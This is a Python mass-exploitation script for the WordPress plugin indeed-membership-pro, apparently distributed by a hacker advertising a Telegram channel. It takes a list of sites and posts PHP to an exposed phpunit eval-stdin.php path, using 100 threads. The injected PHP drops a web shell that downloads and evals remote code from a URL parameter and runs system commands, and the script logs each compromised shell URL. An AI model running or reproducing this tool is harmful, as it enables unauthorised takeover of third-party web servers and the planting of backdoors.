import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
#Coded By: RxR HaCkE
fr  =   Fore.RED
fg  =   Fore.GREEN

# banner = '''{}
           
>=>      >=>           >======>         >===>          >===>      >===>>=====> 
 >=>   >=>   >====>>=> >=>    >=>     >=>    >=>     >=>    >=>        >=>     
  >=> >=>         >=>  >=>    >=>   >=>        >=> >=>        >=>      >=>     
    >=>          >=>   >> >==>      >=>        >=> >=>        >=>      >=>     
  >=> >=>       >=>    >=>  >=>     >=>        >=> >=>        >=>      >=>     
 >=>   >=>      >=>    >=>    >=>     >=>     >=>    >=>     >=>       >=>     
>=>      >=>    >=>    >=>      >=>     >===>          >===>           >=>     
          ############## indeed-membership-pro exploit ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller  

# \n'''.format(fr)
# print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))


filename = "RxR_" + ran(8) + ".php"
class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
		self.filename = filename
		self.shell_content = "<?php  echo \"<title>Uploader RxR HaCkEr</title>RxR HaCkEr  :=== > > > Telegram: https://t.me/x7seller\".\"</br>\".php_uname(); echo \"</br>\".$_SERVER[\"DOCUMENT_ROOT\"].\"/\"; $ch = curl_init($_GET[\"get\"]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval(\"?>\".$result); if(isset($_GET[\"cmd\"])){ echo \"<pre>\"; echo system($_GET[\"amis\"]); echo \"</pre>\"; } ?>"
		self.shell_data = '<?php echo \'RxR HaCkEr\';echo $file = fopen($_SERVER[\'DOCUMENT_ROOT\'].\'/{}\',\'w\'); $content = \'{}\'; fwrite($file,$content)?>'.format(self.filename,self.shell_content)
	
	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
	def GetShell(self, site):
		try:
				url = "http://" + self.URLdomain(site)
			#check = requests.get(url, headers=self.headers, verify=False, timeout=25).content
			#if 'indeed-membership-pro' in check:
				if(self.Uploader(url)):
					Shell = url + "/" + self.filename
					gx = requests.get(Shell , headers=self.headers).content
					if 'RxR HaCkEr' in gx:
						print('Target:{} --> {}[Succefully Uploading]').format(Shell, fg)
						open('Uploaders.txt', 'a').write(Shell + '\n')

				else:
					print('Target:{} -->! {}[Failid]').format(url.split("/")[2], fr)
			#else:
			#	print('Target:{} -->! {}[Failid]').format(url.split("/")[2], fr)
		except:
			pass
	def Uploader(self, url):
		try:

			self.data = self.shell_data
			UploadFile = requests.get(url + "/wp-content/plugins/indeed-membership-pro/classes/PaymentGateways/mollie/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", data=self.data, headers=self.headers, verify=False, timeout=25).content
			if 'RxR HaCkEr' in UploadFile:
				return(True)
			else:
				return(False) 
				
		except:
			pass


	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.GetShell(site)
		#WsoControl.CheckShell(site)
	
	except:
		pass
#RunUploader("https://coimplante.odo.br")
mp = Pool(100)
mp.map(RunUploader, target)
mp.close()
mp.join()